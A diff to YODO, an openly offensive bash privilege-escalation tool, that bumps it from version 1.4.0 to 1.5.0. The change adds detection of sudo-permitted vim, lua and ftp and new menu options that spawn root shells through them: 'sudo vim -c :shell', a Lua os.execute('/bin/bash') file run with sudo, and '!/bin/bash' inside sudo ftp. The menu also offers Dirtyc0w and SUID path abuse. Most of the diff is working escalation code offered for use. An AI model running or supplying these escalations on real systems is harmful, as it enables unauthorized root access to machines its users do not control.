@@ -85,7 +85,10 @@ cGdb=$( grep -ic "gdb" check.txt )
 cRuby=$( grep -ic "ruby" check.txt )
 cB3=$( grep -ic "NOPASSWD" check.txt )
 cPerl=$( grep -ic "perl" check.txt )
-cTee=$( grep -ic "tee" check.txt )	
+cTee=$( grep -ic "tee" check.txt )
+cVim=$( grep -ic "vim" check.txt )
+cLua=$( grep -ic "lua" check.txt )
+cFtp=$( grep -ic "ftp" check.txt )	
 # Function check
 if [ $cFind -gt 0 ]; then
 	echo " [·] find"
@@ -115,6 +118,12 @@ elif [ $cPerl -gt 0 ]; then
 	echo " [·] perl"
 elif [ $cTee -gt 0 ]; then
 	echo " [·] tee"
+elif [ $cVim -gt 0 ]; then
+	echo " [·] vim"
+elif [ $cLua -gt 0 ]; then
+	echo " [·] lua"
+elif [ $cFtp -gt 0 ]; then
+	echo " [·] ftp"
 else 
 	echo -e " good luck \e[m"
 fi
@@ -123,13 +132,14 @@ rm check.txt
 echo
 echo -e "\e[1;92m Select From the menu:"
 echo 
-echo "   1) Find                8) More *                15) Tee"
-echo "   2) AWK                 9) Man  *                16) VSP °‡"
-echo "   3) Nmap               10) Dirtyc0w °‡           17) Pathzuzu °‡"
-echo "   4) Vi                 11) Gdb                   18) History °‡"
-echo "   5) Python             12) Ruby                  19) Credits"
-echo "   6) Irb                13) b3                    20) Update"
-echo "   7) Less *             14) Perl                  99) Exit"
+echo "   1) Find                8) Man  *              17) Pathzuzu °‡"
+echo "   2) AWK                10) Dirtyc0w °‡         18) History °‡"
+echo "   3) Nmap               11) Gdb                 19) Vim"
+echo "   4) Vi                 12) Ruby                20) Lua"
+echo "   5) Python             13) b3                  21) Ftp *"
+echo "   6) Irb                14) Perl                22) Credits"
+echo "   7) Less *             15) Tee                 23) Update"
+echo "   8) More *             16) VSP °‡              99) Exit"
 echo -e "\e[m"
 echo " VSP = Vulnerable Script Permissions"
 echo " Pathzuzu = SUID exploitation threw Path vulnerability"
@@ -340,10 +350,23 @@ elif [ $number = 18 ]; then
 				cat $histSpec
 				exit 1
 		fi
-# CREDITS
+# VIM
 elif [ $number = 19 ]; then
+	clear	
+	sudo vim -c ':shell'
+# LUA 
+elif [ $number = 20 ]; then
+	echo "os.execute('/bin/bash')" > lua
+	sudo lua lua
+# FTP
+elif [ $number = 21 ]; then
+	echo "I need you to help me here!"
+	read -p "Press enter and then type: !/bin/bash"
+	sudo ftp
+# CREDITS
+elif [ $number = 22 ]; then
 	echo
-	echo "  YODO version 1.4.0"
+	echo "  YODO version 1.5.0"
 	echo "  Created by: b3rito"
 	echo "  Report bugs: b3rito@mes3hacklab.org"
 	echo "  Homepage: http://mes3hacklab.org/yodo.html"
@@ -353,7 +376,7 @@ elif [ $number = 19 ]; then
 	echo "  ascii art by m"
 	echo
 # UPDATE
-elif [ $number = 20 ]; then
+elif [ $number = 23 ]; then
 	wget "https://raw.githubusercontent.com/b3rito/yodo/master/yodo.sh" -O yodo.sh
 # EXIT
 elif [ $number = 99 ]; then
